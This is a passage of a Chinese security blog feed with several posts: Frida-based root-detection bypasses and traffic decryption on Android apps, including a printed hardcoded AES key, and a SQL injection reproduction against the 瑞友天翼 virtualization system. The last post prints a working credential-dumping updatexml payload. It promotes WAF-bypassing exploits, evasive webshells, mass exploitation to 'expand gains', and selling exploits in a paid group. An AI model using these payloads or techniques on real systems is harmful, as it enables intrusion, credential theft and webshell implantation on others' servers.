        <content type="html"><![CDATA[<h2 id="app样本"><a href="#app样本" class="headerlink" title="app样本"></a>app样本</h2><ul><li>闲来无事搞一个app,不知道找啥目标搞。结果翻着翻着找到今天的主角那就搞它了。传说中的和抖音同名的抖阴app。常规操作下载app安装打开。介于这个app是有颜色的所以本次全部不打码直接搞。</li></ul><h2 id="过root检测"><a href="#过root检测" class="headerlink" title="过root检测"></a>过root检测</h2><ul><li>打开app一看这个提示这我的暴脾气能忍么。检测到手机root。。说我使用的模拟器或者设备已经被root了。<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281431776.png" alt="检测到手机root"></p></li><li>首先拖到jadx看看是否加壳。发现没有被加壳。但是app混淆了。握擦这防护的这么流弊么</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281435765.png" alt="混淆截图"></p><li>首先开启我们的firda看看这货检测不检查frida什么的。发现不检查。这小子还算识相。这时候我们想到可以用objection 的disable root来干掉root检测。但是也有可能干不掉。如果app检测root手段比较全面呢。所以我们用自己写的firda root检测定位脚本来测试一下</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281437899.png" alt="没有检测frida"></p><li>用自己写的root定位检测脚本来看看。这样hook 。然后点击确定。进程没有退出我们已经hook了。然后在打开app看操作</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281440654.png" alt="hook截图"></p><li>打开app看看是否触发了root检测脚本。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281442634.png" alt="检测点在"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">at java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>blankj<span class="token punctuation">.</span>utilcode<span class="token punctuation">.</span>util<span class="token punctuation">.</span>w<span class="token punctuation">.</span><span class="token function">q</span><span class="token punctuation">(</span>DeviceUtils<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>niming<span class="token punctuation">.</span>weipa<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>splash<span class="token punctuation">.</span>SplashActivity<span class="token punctuation">.</span><span class="token constant">A</span><span class="token punctuation">(</span>SplashActivity<span class="token punctuation">.</span>kt<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>niming<span class="token punctuation">.</span>weipa<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>splash<span class="token punctuation">.</span>SplashActivity<span class="token punctuation">.</span><span class="token constant">K</span><span class="token punctuation">(</span>SplashActivity<span class="token punctuation">.</span>kt<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>niming<span class="token punctuation">.</span>weipa<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>splash<span class="token punctuation">.</span>SplashActivity<span class="token punctuation">.</span><span class="token function">initView</span><span class="token punctuation">(</span>SplashActivity<span class="token punctuation">.</span>kt<span class="token operator">:</span></code></pre><li>接下来分析一波这个函数。当然这里已经进去系统了已经过掉了root检测了。当然如果没有过掉那么你分析一下这个检测函数被谁调用一级一级推断最后找到总检测函数直接hook掉就行了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281446178.png" alt="检测点"></p></ul><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><ul><li>抓包发现三处加密</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281529668.png" alt="请求加密的截图">)</p><li>分析请求头肯定是有hashmap 这种keyvalue的形式。和hook java bytes字节的方式。所以我们直接hook这种掏出我们的写的js脚本神器hook。直接拿捏定位。 com.niming.weipa.utils.b.b  com.niming.weipa.utils.b.a  猜测是aes加密算法</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281454667.png" alt="hook定位1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281458394.png" alt="hook定位2"></p><li>根据定位反推一下上一层函数。发现和我们请求包的函数一样。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281459582.png" alt="上层函数位置"></p><li>看代码。重点分析一下。f5317d 应该就是秘钥了。当然你直接hook秘钥也行。我们看这个他代码的意思是如果是release debug key就取TestUtil.getSecret2(); 否则是 如果是"release", "staging 取这个TestUtil.getSecretPre() 否则就是取这个 TestUtil.getSecret();。最终是取了TestUtil.getSecret();。这里需要java 基础和安卓的函数基础如果不知道的可以hook看看</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281502758.png" alt="加密代码分析"></p><li>我们重点看TestUtil.getSecret(); 里面的这个函数。我们发现这个是native函数(一般这代码大部分在so文件里面)又发现采用静态加载方式System.loadLibrary("security");  那在lib目录表现形式是libsecurity.so所以我们找这个so曾经就行 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281507988.png" alt="native函数"></p><li>分析一下这个libsecurity.so   getSecret 函数一般在so文件表现形式是java全包名和函数名称以_连接。并且在导出表里面。具体看截图。我们看。32位的so文件用32位的ida打开。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281511727.png" alt="32位so曾经"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281513946.png" alt="函数位置"></p><li>看函数的逻辑。我们看到返回一个字符串这就是key了 l8N2iooyp07M9IWa 填充方式加密模式 AES/ECB/PKCS7Padding,</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281514193.png" alt="so层函数"></p></ul><h2 id="验证和总结"><a href="#验证和总结" class="headerlink" title="验证和总结"></a>验证和总结</h2><ul><li>验证是否正确解密一下看看。其他三处也是同样方式</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281517193.png" alt="成功解密"></p><li>总结要想理解今天的文章。需要动java基础 和java函数在so文件中如何调用如果并且使用的。函数的注册方式静态注册和动态注册等主要system.load 这个函数的函数并不一定就在这个so文件里面可能是个假的 so。通过动态方式注册的。本文恰好就在。要想在so层逆向中牛逼必要的c++和汇编和ida这些知识要学习的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某了app非标准base64算法无壳算法混淆brida渗透测试案例</title>
      <link href="/androidreverse/2023/04/articles/a2e5bddade12ebbb/"/>
      <url>/androidreverse/2023/04/articles/a2e5bddade12ebbb/</url>
      
        <content type="html"><![CDATA[<h2 id="brida介绍"><a href="#brida介绍" class="headerlink" title="brida介绍"></a>brida介绍</h2><ul><li>Brida 是 Burp 中的一个插件，它可以把app 和Frida  和  Burp结合起来使用，简化测试流程，通过 Brida 能在 Burp 中直接调用目标 app 中的加 / 解密函数。对app进行测试适用于无法或者复现难度较大的算法。比如本次的案例。</li></ul><h2 id="app测试流程"><a href="#app测试流程" class="headerlink" title="app测试流程"></a>app测试流程</h2><ul><li>(1)拿到一个app先安装</li><li>(2)安装完毕以后抓包,用到的工具(postern + Charles) </li><li>(3)抓包分析算法定位(查壳,脱壳,hook,jadx 反编译,jeb工具,frida) </li><li>(4)编写hook脚本(implemention ) </li><li>(5)深度分析加密算法流程</li><li>(6)编写主动调用算法脚本并且测试</li><li>(7)在brida中编写测试js脚本(这里用到主动调用脚本)</li><li>(8)在brida中测试加密解密函数</li><li>(9)在brida中编写 handler  Request ,response 脚本</li><li>(10)请求包中使用明文,响应包中密文进行测试。最终用brup进行渗透测试</li><li>总结:要搞好安卓逆向需要学习的是java基础,渗透测试技术,JavaScript 语法 ,frida语法基础,,汇编二进制逆向(这个渗透测试不需要掌握太猛)。这些是必要条件。最后的一条不需要太厉害懂点就行了除非你是专业逆向人员。</li></ul><h2 id="测试案例app某了分析加密解密结果"><a href="#测试案例app某了分析加密解密结果" class="headerlink" title="测试案例app某了分析加密解密结果"></a>测试案例app某了分析加密解密结果</h2><ul><li>至于如何进行app测试参照上面的流程演示的是某聊天app</li><li>抓包有三处加密请求有两处。响应有一处。总共三处</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191535112.png" alt="抓包"></p><li>看到这里立马会想到用bytes字节函数进行定位说干就干。启动frida 。搞一波我们的脚本直接定位  b.o.a.h.b$e.h      b.o.a.c.b.h.intercept   两个可疑点    </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191544208.png" alt="直接定位"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191548639.png" alt="两个可疑点"></p><li>那我们用jadx反编译一下看看这个类b.o.a.h.b。我们看请求包里面有data 有encrypt 关键字肯定就是这里了 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191643023.png" alt="反编译查壳关键类"></p><li>点进去第一个看看。这个意思是把这些数据转换成json然后进行加密</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191647334.png" alt="确定加密算法"></p><li>定位加密函数 f 我们hook一下这个函数</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191654493.png" alt="加密"></p><li>hook出加密前的东东了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191656304.png" alt="加密前"></p><li>找找响应包堆栈定位一波看看。发现啥都没有。在看看请求是okhttp3。我们直接用ok3定位一下</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191704813.png" alt="发现啥都没有"></p><li>直接用okhttp3直接定位</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191709715.png" alt="直接定位"></p><li>通过分析到下图。点进去看看<li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191711414.png" alt="分析得到结果"></p><li>得到解密函数。下来编写hook进行验证。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191712761.png" alt="解密函数"></p><li>编写frida hook脚本验证测试结果。验证成功</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191714394.png" alt="加密解密函数验证"></p><li>编写主动调用加密解密函数这需要java基础才可以</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191719701.png" alt="验证成功成功解密"></p></ul><h2 id="brida脚本编写插件配置实现自动化加密加密"><a href="#brida脚本编写插件配置实现自动化加密加密" class="headerlink" title="brida脚本编写插件配置实现自动化加密加密"></a>brida脚本编写插件配置实现自动化加密加密</h2><ul><li>我看分析了一下发现加密解密函数调用码表是猜测是base64算法但是魔改的。由于混淆比较严重编程功力的问题。我们选择神器brida来进行测试。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191722801.png" alt="码表"></p><li>配置brida环境什么的参考网络上这里直接进行实战配置。使用Charles 转发请求到bp</li><p><img src="https://raw.githubusercontent.com/peiqiF4ck/mybologimg/main/img/202304191730656.png" alt="bp请求包"></p><li>启动brida</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191735701.png" alt="brida启动界面"></p><li>编写脚本brida脚本。调用测试。测试成功</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191739064.png" alt="编写brida脚本"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191743861.png" alt="测试brida脚本"></p><li>接下来就是重点了 编写联动插件函数了。由于篇幅太长我就不演示如何编写了可以参考bi站文章或者后续加入内部群</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191746938.png" alt="插件编写"></p><li>测试成功</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191801076.png" alt="明文请求了"></p></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>关键是有java编程基础和frida使用基础和正则表达式编写基础才可以达到这个程度!!!</li></ul>s]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> Brida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某app绕过root检测分享-几维加固</title>
      <link href="/androidreverse/2023/04/articles/6163f59aa1645267/"/>
      <url>/androidreverse/2023/04/articles/6163f59aa1645267/</url>
      
        <content type="html"><![CDATA[<h2 id="几维加固"><a href="#几维加固" class="headerlink" title="几维加固"></a>几维加固</h2><ul><li>动应用加固系统是一款针对APK文件的自动化安全加固产品，可以提高应用程序的代码安全性、数据安全性和自主防御能力，并且符合《GBT25070-2019信息安全技术网络安全等级保护安全设计技术要求》【简称:等保 2.0】中的移动互联安全计算环境设计技术要求。可以帮助金融、手游、电商、社交等行业解决移动应用的诸多安全问题，包括核心代码被反编译、应用被仿冒、API 接口暴露、密钥被窃取、请求协议被伪造，APK 包被植入恶意代码等，提供全面的标准化安全保护功能。<p>用户只需要提供APK包即可快速集成防静态工具分析、Dex 文件保护、So 文件保护、内存保护、反调试、防二次打包、本地数据加密、资源文件加密等多项安全功能。</p></li></ul><h2 id="app分析"><a href="#app分析" class="headerlink" title="app分析"></a>app分析</h2><ul><li>使用市面上的查壳工具出不出什么壳子。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181545045.png" alt="用jadx打开就一个类"></p><li>使用工具查壳信息https://github.com/horsicq/XAPKDetector 也查不出什么壳子。这个工具可以看详情啥的。最后利用MT工具查出的壳子是几维安全的壳子。由于刚搞app这个壳子完全没有听过。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181558019.png" alt="几维安全"></p><li>打开app正要抓包的时候弹出一个提示说设备以及root。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181601981.png" alt="提示设备已经root"></p><li>这时候的想法是我们拿出我们的神器frida 在拿出我们的hookroot的脚本搞他。或者是用objection 搞说干就干frida报错了 Failed to attach: unexpected error while attaching to process with pid 19517 这明显是防止attach的错误。我们在测试spwn 也报错 Bad access due to invalid address </li><pre class="language-none"><code class="language-none">0x776d5708dc &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;libart.so0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8a0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8a0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8a0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8aProcess crashed: Bad access due to invalid address****** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***Build fingerprint: &#39;google&#x2F;sailfish&#x2F;sailfish:10&#x2F;QP1A.191005.007.A3&#x2F;5972272:user&#x2F;release-keys&#39;Revision: &#39;0&#39;ABI: &#39;arm64&#39;Timestamp: 2023-04-17 16:01:22+0800pid: 24218, tid: 24218, name: etease.nim.avic  &gt;&gt;&gt; com.netease.nim.avic &lt;&lt;&lt;uid: 10202signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x76fa500000    x0  00000076fa500000  x1  0000000000000000  x2  0000000000021000  x3  00000076fa500000    x4  00000076fa521000  x5  0000000000000001  x6  0000000000000000  x7  000000000000d000    x8  00000077f3bb2ed0  x9  0000000000021000  x10 884a5413cd36b29d  x11 5851f42d4c957f2d    x12 14057b7ef767814f  x13 000000000000c000  x14 00000077f14f7000  x15 ff51afd7ed558ccd    x16 00000077f15c68d8  x17 00000077f15537c0  x18 00000077f389c000  x19 0000000000021000    x20 00000076fa500000  x21 0000007fed9cf504  x22 0000007fed9cf49c  x23 000000776dc025f8    x24 00000077f2615430  x25 0000000000000040  x26 000000776dc2ddc0  x27 000000776dc2d0c0    x28 000000776dc00980  x29 0000007fed9cf420    sp  0000007fed9cf190  lr  00000077f153cbdc  pc  00000077f155384cbacktrace:      #00 pc 000000000007e84c  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (memset+140) (BuildId: 5812256023147338b8a9538321d4c456)      #01 pc 0000000000067bd8  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (extent_recycle+3672) (BuildId: 5812256023147338b8a9538321d4c456)      #02 pc 0000000000066d70  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_extents_alloc+44) (BuildId: 5812256023147338b8a9538321d4c456)      #03 pc 000000000004e8c0  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_arena_extent_alloc_large+152) (BuildId: 5812256023147338b8a9538321d4c456)      #04 pc 000000000006c49c  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_large_palloc+512) (BuildId: 5812256023147338b8a9538321d4c456)      #05 pc 0000000000046b00  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_calloc+2508) (BuildId: 5812256023147338b8a9538321d4c456)      #06 pc 0000000000040264  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (calloc+44) (BuildId: 5812256023147338b8a9538321d4c456)      #07 pc 00000000000a5a20  &#x2F;data&#x2F;app&#x2F;com.netease.nim.avic-l9CVU6oTzmoWP9co9LC-iA&#x3D;&#x3D;&#x2F;lib&#x2F;arm64&#x2F;libKwProtectSDK.so (BuildId: ece12da60a11f31e9398bb91bf127ba9dd122b75)      #08 pc 0000000000050cf8  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__dl__ZL10call_arrayIPFviPPcS1_EEvPKcPT_mbS5_+276) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #09 pc 0000000000050f14  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__dl__ZN6soinfo17call_constructorsEv+376) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #10 pc 000000000003c970  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__dl__Z9do_dlopenPKciPK17android_dlextinfoPKv+2416) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #11 pc 00000000000380dc  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__loader_android_dlopen_ext+72) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #12 pc 00000000000011d0  &lt;anonymous:7764f58000&gt;</code></pre><li>测试加载libKwProtectSDK.so 软件奔溃了。这里有两种可能一种是检测frida了  另一种是frida版本不兼容报无效访问地址。通过我的测试发现 是frida版本不稳定的原因 要多次spwn才可以正常运行。或者降低frida版本。所以遇到错误要多测试几次要不真以为spwn检测frida。但是在attach模式下是会检测的所以我们也要多次测试保证frida先于app attach上!!!!</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181615684.png" alt="正常运行了"></p></ul><h2 id="几维安全加固的特征脱壳演示"><a href="#几维安全加固的特征脱壳演示" class="headerlink" title="几维安全加固的特征脱壳演示"></a>几维安全加固的特征脱壳演示</h2><ul><li>在lib目录里有有libKwProtectSDK.so 。在assets 目录里面有 kadp_arm64-v8a。此外这个版本是整体加固所以我们使用 葫芦娃大佬的frida-dexdump进行脱壳</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181628134.png" alt="几维安全加固特征"></p><li>脱壳演示<li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181631629.png" alt="脱壳成功接下来就是分析"></p></ul><h2 id="frida-hook脚本定位检测点"><a href="#frida-hook脚本定位检测点" class="headerlink" title="frida hook脚本定位检测点"></a>frida hook脚本定位检测点</h2><ul><li>定位root检测点</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181642221.png" alt="定位root检测点"></p><li>使用我们的脚本可能由于我们的脚本检测不全所以也弹出框。所以我们直接编写hook 检测函数的脚本直接上。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181650219.png" alt="过掉root检测"></p></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>(1)遇到app奔溃的时候多测试几次或者换一个版本低点的进行测试</li><li>(2)多自己写点常用检测定的脚本方便定位</li><li>(3)在frida hook时候我们必须要熟练掌握常用hook api和javase基础才能够好的学习app</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>瑞友天翼应用虚拟化系统sql注入导致代码执行漏洞复现</title>
      <link href="/penetrationtest/2023/04/articles/5d3d24785f2881ff/"/>
      <url>/penetrationtest/2023/04/articles/5d3d24785f2881ff/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="瑞友天翼应用虚拟化系统介绍"><a href="#瑞友天翼应用虚拟化系统介绍" class="headerlink" title="瑞友天翼应用虚拟化系统介绍"></a>瑞友天翼应用虚拟化系统介绍</h1><ul><li>瑞友天翼应用虚拟化系统（GWT System）是国内具有自主知识产权的应用虚拟化平台，是基于服务器计算（Server-based Computing）的应用虚拟化平台。它将用户所有应用软件（ERP、OA、CRM、PDM、CAD……）集中部署在天翼服务器（群）上，客户端通过WEB即可快速安全的访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等，从而为用户打造集中、便捷、安全、高效的虚拟化支撑平台。操作终端无需再安装应用程序，通过天翼独特的RAP 协议（Remote Application Protocol），即可让用户快速访问服务器上的各类应用软件；天翼RAP 协议只传输鼠标、键盘及屏幕变化的矢量数据，访问仅需3KB/s（20kbps）的带宽，用户不再受客户端和连接性能要求的限制，在任何时间、任何地点，利用任何设备、任何网络连接方式，即可高效安全地访问服务器（群）上的应用程序和关键资源</li></ul><h2 id="系统界面"><a href="#系统界面" class="headerlink" title="系统界面"></a>系统界面</h2><ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151452516.png" alt="主页见面"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151453050.png" alt="管理员界面"></p></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul><li>sql注入漏洞复现截图</li>sql注入简单payload给你们截图放出来了<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151455681.png" alt="sql注入"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">POST</span> <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span><span class="token operator">/</span>Index<span class="token operator">/</span>dologin <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span><span class="token literal-property property">Host</span><span class="token operator">:</span> www<span class="token punctuation">.</span>testcms<span class="token punctuation">.</span>comCache<span class="token operator">-</span>Control<span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token operator">:</span> <span class="token number">1</span><span class="token literal-property property">Origin</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>testcms<span class="token punctuation">.</span>comUser<span class="token operator">-</span>Agent<span class="token operator">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token constant">WOW64</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">108.0</span><span class="token number">.5359</span><span class="token number">.95</span> Safari<span class="token operator">/</span><span class="token number">537.36</span><span class="token literal-property property">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://www.testcms.com/Accept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=qaq1si606l62k871g450g46n01; CookieLanguageName=ZH-CNConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 132name=adminasdfdsfd') and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,`name`,0x3a,pwd,0x23) FROM cuser limit 0,1),0x7e),1)#</span></code></pre><li>sql注入写文件 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151502987.png" alt="shell脚本"></p><li>sql注入接口通杀 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151504432.png" alt="通杀"></p><li>直接添加管理员</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151507700.png" alt="管理员添加用户"></p></ul><h2 id="实战最新版本过阿里云waf-getshell"><a href="#实战最新版本过阿里云waf-getshell" class="headerlink" title="实战最新版本过阿里云waf  getshell"></a>实战最新版本过阿里云waf  getshell</h2><ul><li><p>使用我们的变形sql注入exp 通杀最新版  直接getshell。我们的工具不光是用别人现成的exp直接集成而是经过我们加工使他能够绕过waf。来获取更多目标网站。从而扩大战果。</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151926857.png" alt="实战getshell"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304151940176.png" alt="实战添加管理员"></p></li></ul><h2 id="瑞友天翼应用虚拟化系统远程代码执行漏洞武器化实战演示截图"><a href="#瑞友天翼应用虚拟化系统远程代码执行漏洞武器化实战演示截图" class="headerlink" title="瑞友天翼应用虚拟化系统远程代码执行漏洞武器化实战演示截图"></a>瑞友天翼应用虚拟化系统远程代码执行漏洞武器化实战演示截图</h2><p>详情请看:<a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304161951372.png" alt="集成批量武器化7.x"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181420304.png" alt="集成批量武器化6.x"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><ul><li>最近挺火的瑞友天翼应用虚拟化系统远程代码执行漏洞。本来不打算搞了。各种公众号马赛克只讲代码审计。没有exp这能行。直接日他说这些。要不说群主水平存在问题。这个只要知道路径。并且有php接口。复现应该通杀。 后续集成到软件。网马采用自写的冰蝎免杀一句话 。十六进制编码方式。sql注入的过waf的变形exp。以后内部群$给到位的。我能分析能复现的漏洞和漏洞原理 调试文件直接 发到群里。授人以鱼不如授人以渔😏 。另外比接口可以直接添加管理员😏。主要是源码难找漏洞不难。情报链接 https://mp.weixin.qq.com/s/zeH6p5lFQ4kzu5HpfTpXog</li></ul><h2 id="关于复现漏洞计划"><a href="#关于复现漏洞计划" class="headerlink" title="关于复现漏洞计划"></a>关于复现漏洞计划</h2><ul><li>后续有复现的漏洞有时间全部集成到我们的批量自动化工具里面。让它变成很牛逼的工具。相信我们集成exp都是自己的免杀网马和过waf的 exp。</li></ul>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>okhttp3框架frida hook脚本-原创</title>
      <link href="/androidreverse/2023/04/articles/1680858695738790/"/>
      <url>/androidreverse/2023/04/articles/1680858695738790/</url>
      
